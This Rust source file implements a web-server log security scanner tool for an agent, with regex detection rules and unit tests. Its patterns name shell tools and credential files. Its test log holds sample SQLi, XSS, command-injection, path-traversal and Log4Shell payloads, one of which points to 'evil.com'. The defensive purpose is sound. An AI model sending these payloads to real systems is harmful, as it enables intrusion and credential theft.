use async_trait::async_trait;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::io::{BufRead, BufReader};
use std::fs::File;
use regex::Regex;

use super::Tool;
use crate::context::ToolContext;
use crate::error::AgentResult;

/// Web server log security scanner — parses Nginx/Apache access logs
/// and detects security threats (SQLi, XSS, RCE, path traversal, scanners).
///
/// Ported from RavenEye's log-worker.js security assessment engine.
pub struct IrWeblogScanTool;

// ── Risk bitmask flags ──────────────────────────────────────────
const RISK_SQLI: u32       = 1 << 0;
const RISK_XSS: u32        = 1 << 1;
const RISK_RCE: u32        = 1 << 2;
const RISK_TRAVERSAL: u32  = 1 << 3;
const RISK_SCANNER: u32    = 1 << 4;
const RISK_SUSPICIOUS: u32 = 1 << 5;

// ── Security regex patterns (compiled once) ─────────────────────
struct SecurityPatterns {
    sqli: Vec<Regex>,
    xss: Vec<Regex>,
    rce: Vec<Regex>,
    traversal: Vec<Regex>,
    scanners: Vec<Regex>,
}

impl SecurityPatterns {
    fn new() -> Self {
        Self {
            sqli: vec![
                Regex::new(r"(?i)(?:union\s+(?:all\s+)?select|select\s+.*from\s+information_schema)").unwrap(),
                Regex::new(r"(?i)(?:'\s*(?:or|and)\s+\s*['\d]).*=").unwrap(),
                Regex::new(r"(?i)(?:;\s*(?:drop|alter|truncate|delete|insert|update)\s+)").unwrap(),
                Regex::new(r"(?i)(?:benchmark\s*\(|sleep\s*\(|waitfor\s+delay)").unwrap(),
                Regex::new(r"(?i)(?:load_file\s*\(|into\s+(?:out|dump)file)").unwrap(),
                Regex::new(r"(?i)(?:concat\s*\(|char\s*\(|group_concat\s*\()").unwrap(),
                Regex::new(r"(?i)(?:0x[0-9a-f]+\s|\\x[0-9a-f]{2}|%27|%22|%3B)").unwrap(),
            ],
            xss: vec![
                Regex::new(r"(?i)<script[^>]*>").unwrap(),
                Regex::new(r"(?i)(?:javascript|vbscript|data)\s*:").unwrap(),
                Regex::new(r"(?i)on(?:error|load|click|mouseover|focus|blur)\s*=").unwrap(),
                Regex::new(r"(?i)<(?:img|svg|iframe|object|embed|video|audio|body)\b[^>]*(?:src|href)\s*=").unwrap(),
                Regex::new(r"(?i)(?:alert|confirm|prompt|eval)\s*\(").unwrap(),
                Regex::new(r"(?i)%3Cscript|%3Csvg|&#x3C;script").unwrap(),
            ],
            rce: vec![
                Regex::new(r"(?i)(?:;|\||`|\$\()\s*(?:cat|ls|id|whoami|uname|pwd|wget|curl|nc|bash|sh|cmd|powershell)\b").unwrap(),
                Regex::new(r"(?i)(?:eval|exec|system|passthru|shell_exec|popen)\s*\(").unwrap(),
                Regex::new(r"(?i)\$\{(?:jndi|env|sys)\b").unwrap(),  // Log4Shell
                Regex::new(r"(?i)(?:cmd|command)\s*=\s*(?:/c|/k|echo|set)").unwrap(),
                Regex::new(r"(?i)\.\./\.\./\.\.").unwrap(),  // Deep traversal
            ],
            traversal: vec![
                Regex::new(r"(?:\.\./|\.\.\\){2,}").unwrap(),
                Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|hosts|issue)|/proc/self|/windows/system32)").unwrap(),
                Regex::new(r"(?i)(?:%2e%2e%2f|%2e%2e/|\.\.%2f|%252e%252e%255c)").unwrap(),
                Regex::new(r"(?i)(?:boot\.ini|win\.ini|system\.ini)").unwrap(),
            ],
            scanners: vec![
                Regex::new(r"(?i)(?:nikto|nmap|masscan|dirbuster|gobuster|wfuzz|sqlmap|burpsuite|acunetix|nessus|openvas|zap)").unwrap(),
                Regex::new(r"(?i)(?:nuclei|wpscan|joomscan|droopescan|cmsmap|vbscan)").unwrap(),
                Regex::new(r"(?i)(?:python-requests|python-urllib|go-http-client|java/|libwww-perl|curl/|wget/)").unwrap(),
                Regex::new(r"(?i)(?:\.\.(?:/|%2[fF])){3,}").unwrap(),  // Aggressive probing
                Regex::new(r"(?i)(?:/wp-admin|/wp-login|/administrator|/phpmyadmin|/\.env|/\.git)").unwrap(),
            ],
        }
    }

    fn assess(&self, path: &str, ua: &str) -> (u32, Vec<String>) {
        let mut mask: u32 = 0;
        let mut labels = Vec::new();

        for re in &self.sqli {
            if re.is_match(path) {
                mask |= RISK_SQLI;
                if !labels.contains(&"SQLi".to_string()) { labels.push("SQLi".to_string()); }
                break;
            }
        }
        for re in &self.xss {
            if re.is_match(path) {
                mask |= RISK_XSS;
                if !labels.contains(&"XSS".to_string()) { labels.push("XSS".to_string()); }
                break;
            }
        }
        for re in &self.rce {
            if re.is_match(path) {
                mask |= RISK_RCE;
                if !labels.contains(&"RCE".to_string()) { labels.push("RCE".to_string()); }
                break;
            }
        }
        for re in &self.traversal {
            if re.is_match(path) {
                mask |= RISK_TRAVERSAL;
                if !labels.contains(&"PathTraversal".to_string()) { labels.push("PathTraversal".to_string()); }
                break;
            }
        }
        for re in &self.scanners {
            if re.is_match(path) || re.is_match(ua) {
                mask |= RISK_SCANNER;
                if !labels.contains(&"Scanner".to_string()) { labels.push("Scanner".to_string()); }
                break;
            }
        }
        if mask == 0 && (path.contains('%') || path.contains("..") || path.contains('<')) {
            mask |= RISK_SUSPICIOUS;
            labels.push("Suspicious".to_string());
        }

        (mask, labels)
    }
}

// ── Log format detection ────────────────────────────────────────
#[derive(Debug, Clone, Copy)]
enum LogFormat {
    Combined,   // Apache/Nginx combined
    Common,     // Apache/Nginx common
    IngressNginx,
    Unknown,
}

fn detect_format(line: &str) -> LogFormat {
    if line.contains("\" \"-\" ") && line.matches('"').count() >= 8 {
        LogFormat::Combined
    } else if line.contains("\" \"-\" ") {
        LogFormat::Common
    } else if line.contains("$http_x_forwarded_for") || line.contains("ingress") {
        LogFormat::IngressNginx
    } else if line.matches('"').count() >= 6 {
        LogFormat::Combined
    } else {
        LogFormat::Unknown
    }
}

// ── Parsed log entry ────────────────────────────────────────────
struct LogEntry {
    ip: String,
    timestamp: String,
    method: String,
    path: String,
    status: u16,
    size: u64,
    referer: String,
    user_agent: String,
    risk_mask: u32,
    risk_labels: Vec<String>,
}

// ── Combined log regex ──────────────────────────────────────────
static COMBINED_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
    Regex::new(r#"^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\S+)\s+(.*?)\s+\S+"\s+(\d+)\s+(\d+)\s+"([^"]*)"\s+"([^"]*)""#).unwrap()
});

fn parse_combined_line(line: &str) -> Option<LogEntry> {
    let caps = COMBINED_RE.captures(line)?;

    let ip = caps.get(1)?.as_str().to_string();
    let timestamp = caps.get(2)?.as_str().to_string();
    let method = caps.get(3)?.as_str().to_string();
    let path = caps.get(4)?.as_str().to_string();
    let status = caps.get(5)?.as_str().parse().unwrap_or(0u16);
    let size = caps.get(6)?.as_str().parse().unwrap_or(0u64);
    let referer = caps.get(7)?.as_str().to_string();
    let user_agent = caps.get(8)?.as_str().to_string();

    Some(LogEntry {
        ip,
        timestamp,
        method,
        path,
        status,
        size,
        referer,
        user_agent,
        risk_mask: 0,
        risk_labels: Vec::new(),
    })
}

#[async_trait]
impl Tool for IrWeblogScanTool {
    fn name(&self) -> &str { "ir_weblog_scan" }

    fn description(&self) -> &str {
        "Web server log security scanner. Parses Nginx/Apache access log files and detects \
         security threats: SQLi, XSS, RCE, path traversal, scanner fingerprints. \
         Returns risk assessment, top IPs, status code distribution, and flagged entries. \
         Supports combined/common log formats. Handles large files efficiently via streaming."
    }

    fn is_builtin(&self) -> bool { true }
    fn is_read_only(&self) -> bool { true }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path to the web server access log file"
                },
                "max_entries": {
                    "type": "integer",
                    "description": "Maximum number of flagged entries to return (default 100)"
                },
                "min_risk": {
                    "type": "string",
                    "enum": ["all", "suspicious", "threat"],
                    "description": "Minimum risk level to include: 'all' (any flag), 'suspicious' (suspicious+), 'threat' (SQLi/XSS/RCE/traversal only). Default 'threat'"
                },
                "top_n": {
                    "type": "integer",
                    "description": "Number of top IPs/status codes to return (default 20)"
                }
            },
            "required": ["file_path"]
        })
    }

    async fn execute(&self, args: Value, _ctx: &ToolContext) -> AgentResult<Value> {
        let file_path = args["file_path"].as_str()
            .ok_or_else(|| -> crate::error::AgentError { "Missing required parameter: file_path".into() })?;

        let max_entries = args["max_entries"].as_u64().unwrap_or(100) as usize;
        let min_risk = args["min_risk"].as_str().unwrap_or("threat");
        let top_n = args["top_n"].as_u64().unwrap_or(20) as usize;

        let file = File::open(file_path)
            .map_err(|e| -> crate::error::AgentError { format!("Cannot open file: {}", e).into() })?;

        let patterns = SecurityPatterns::new();
        let reader = BufReader::new(file);

        let mut total_lines: u64 = 0;
        let mut parsed_lines: u64 = 0;
        let mut flagged: Vec<Value> = Vec::new();
        let mut ip_counts: HashMap<String, u64> = HashMap::new();
        let mut status_counts: HashMap<u16, u64> = HashMap::new();
        let mut risk_counts: HashMap<String, u64> = HashMap::new();
        let mut total_bytes: u64 = 0;
        let mut hourly: HashMap<u8, u64> = HashMap::new();
        let mut detected_format = "unknown";

        let mut lines = reader.lines();
        // Detect format from first non-empty line
        let mut format_detected = false;

        while let Some(line_result) = lines.next() {
            let line = match line_result {
                Ok(l) => l,
                Err(_) => continue,
            };
            total_lines += 1;

            if line.trim().is_empty() { continue; }

            if !format_detected {
                let fmt = detect_format(&line);
                detected_format = match fmt {
                    LogFormat::Combined => "combined",
                    LogFormat::Common => "common",
                    LogFormat::IngressNginx => "ingress-nginx",
                    LogFormat::Unknown => "unknown",
                };
                format_detected = true;
            }

            let mut entry = match parse_combined_line(&line) {
                Some(e) => e,
                None => continue,
            };
            parsed_lines += 1;

            // Risk assessment
            let (mask, labels) = patterns.assess(&entry.path, &entry.user_agent);
            entry.risk_mask = mask;
            entry.risk_labels = labels;

            // Statistics
            *ip_counts.entry(entry.ip.clone()).or_insert(0) += 1;
            *status_counts.entry(entry.status).or_insert(0) += 1;
            total_bytes += entry.size;

            // Extract hour for hourly distribution
            if let Some(bracket) = entry.timestamp.find(':') {
                if let Some(hour_str) = entry.timestamp.get(bracket+1..bracket+3) {
                    if let Ok(hour) = hour_str.parse::<u8>() {
                        if hour < 24 { *hourly.entry(hour).or_insert(0) += 1; }
                    }
                }
            }

            // Filter flagged entries by risk level
            let include = match min_risk {
                "all" => mask != 0,
                "suspicious" => mask & (RISK_SUSPICIOUS | RISK_SQLI | RISK_XSS | RISK_RCE | RISK_TRAVERSAL | RISK_SCANNER) != 0,
                _ => mask & (RISK_SQLI | RISK_XSS | RISK_RCE | RISK_TRAVERSAL) != 0,
            };

            if include && flagged.len() < max_entries {
                for label in &entry.risk_labels {
                    *risk_counts.entry(label.clone()).or_insert(0) += 1;
                }
                flagged.push(json!({
                    "ip": entry.ip,
                    "timestamp": entry.timestamp,
                    "method": entry.method,
                    "path": entry.path,
                    "status": entry.status,
                    "user_agent": entry.user_agent,
                    "risk": entry.risk_labels,
                }));
            }
        }

        // Build top-N sorted lists
        let mut top_ips: Vec<(String, u64)> = ip_counts.into_iter().collect();
        top_ips.sort_by(|a, b| b.1.cmp(&a.1));
        let top_ips: Vec<Value> = top_ips.into_iter().take(top_n)
            .map(|(ip, count)| json!({"ip": ip, "count": count}))
            .collect();

        let mut top_statuses: Vec<(u16, u64)> = status_counts.into_iter().collect();
        top_statuses.sort_by(|a, b| b.1.cmp(&a.1));
        let top_statuses: Vec<Value> = top_statuses.into_iter().take(top_n)
            .map(|(status, count)| json!({"status": status, "count": count}))
            .collect();

        let mut top_hours: Vec<(u8, u64)> = hourly.into_iter().collect();
        top_hours.sort_by_key(|&(h, _)| h);
        let hourly_dist: Vec<Value> = top_hours.into_iter()
            .map(|(hour, count)| json!({"hour": format!("{:02}", hour), "count": count}))
            .collect();

        let risk_summary: Vec<Value> = risk_counts.into_iter()
            .map(|(label, count)| json!({"type": label, "count": count}))
            .collect();

        Ok(json!({
            "status": "ok",
            "file": file_path,
            "format": detected_format,
            "summary": {
                "total_lines": total_lines,
                "parsed_lines": parsed_lines,
                "flagged_entries": flagged.len(),
                "total_bytes": total_bytes,
                "unique_ips": top_ips.len(),
            },
            "risk_summary": risk_summary,
            "top_ips": top_ips,
            "status_codes": top_statuses,
            "hourly_distribution": hourly_dist,
            "flagged_entries": flagged,
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn test_log_content() -> &'static str {
        r#"192.168.1.100 - - [15/Jul/2026:10:15:30 +0800] "GET /index.html HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
192.168.1.101 - - [15/Jul/2026:10:16:01 +0800] "GET /search?q=test' OR '1'='1 HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
10.0.0.5 - - [15/Jul/2026:10:17:22 +0800] "GET /admin?id=1 UNION SELECT username,password FROM users HTTP/1.1" 403 0 "-" "sqlmap/1.5"
192.168.1.102 - - [15/Jul/2026:10:18:45 +0800] "GET /page?content=<script>alert('xss')</script> HTTP/1.1" 200 890 "-" "Mozilla/5.0"
10.0.0.10 - - [15/Jul/2026:10:19:00 +0800] "GET /api?cmd=;cat /etc/passwd HTTP/1.1" 403 0 "-" "curl/7.68.0"
172.16.0.1 - - [15/Jul/2026:10:20:15 +0800] "GET /../../../../etc/shadow HTTP/1.1" 400 0 "-" "Nikto/2.1.6"
192.168.1.100 - - [15/Jul/2026:10:21:30 +0800] "GET /about.html HTTP/1.1" 200 3210 "-" "Mozilla/5.0"
10.0.0.5 - - [15/Jul/2026:10:25:00 +0800] "GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1" 200 0 "-" "Mozilla/5.0"
"#
    }

    fn write_temp_log() -> String {
        let path = std::env::temp_dir().join("test_access.log");
        let mut f = File::create(&path).unwrap();
        f.write_all(test_log_content().as_bytes()).unwrap();
        path.to_string_lossy().to_string()
    }

    #[test]
    fn test_security_patterns() {
        let p = SecurityPatterns::new();

        // SQLi detection
        let (mask, labels) = p.assess("/search?q=test' OR '1'='1", "Mozilla/5.0");
        assert!(mask & RISK_SQLI != 0, "Should detect SQLi");
        assert!(labels.contains(&"SQLi".to_string()));

        // XSS detection
        let (mask, _) = p.assess("/page?content=<script>alert(1)</script>", "Mozilla/5.0");
        assert!(mask & RISK_XSS != 0, "Should detect XSS");

        // RCE detection (Log4Shell)
        let (mask, _) = p.assess("/search?q=${jndi:ldap://evil.com/a}", "Mozilla/5.0");
        assert!(mask & RISK_RCE != 0, "Should detect RCE/Log4Shell");

        // Path traversal
        let (mask, _) = p.assess("/../../../../etc/shadow", "Mozilla/5.0");
        assert!(mask & RISK_TRAVERSAL != 0, "Should detect path traversal");

        // Scanner detection
        let (mask, _) = p.assess("/.env", "sqlmap/1.5");
        assert!(mask & RISK_SCANNER != 0, "Should detect scanner");

        // Clean request
        let (mask, _) = p.assess("/index.html", "Mozilla/5.0");
        assert_eq!(mask, 0, "Clean request should have no risk");
    }

    #[test]
    fn test_weblog_scan_tool() {
        let path = write_temp_log();
        let tool = IrWeblogScanTool;
        let base = crate::context::ReadonlyContext::new("test".into(), "test".into(), "test".into());
        let cb = crate::context::CallbackContext::new(base);
        let ctx = crate::context::ToolContext::new(cb, "test".into(), ".".into());

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(tool.execute(json!({
            "file_path": path,
            "min_risk": "threat",
        }), &ctx)).unwrap();

        assert_eq!(result["status"], "ok");
        assert_eq!(result["format"], "combined");
        let summary = &result["summary"];
        assert!(summary["total_lines"].as_u64().unwrap() >= 8);
        assert!(summary["flagged_entries"].as_u64().unwrap() > 0, "Should have flagged entries");

        // Check that risk summary contains expected types
        let risk_summary = result["risk_summary"].as_array().unwrap();
        let risk_types: Vec<&str> = risk_summary.iter()
            .map(|v| v["type"].as_str().unwrap())
            .collect();
        assert!(risk_types.contains(&"SQLi"), "Should detect SQLi in risk summary");

        std::fs::remove_file(&path).ok();
    }
}
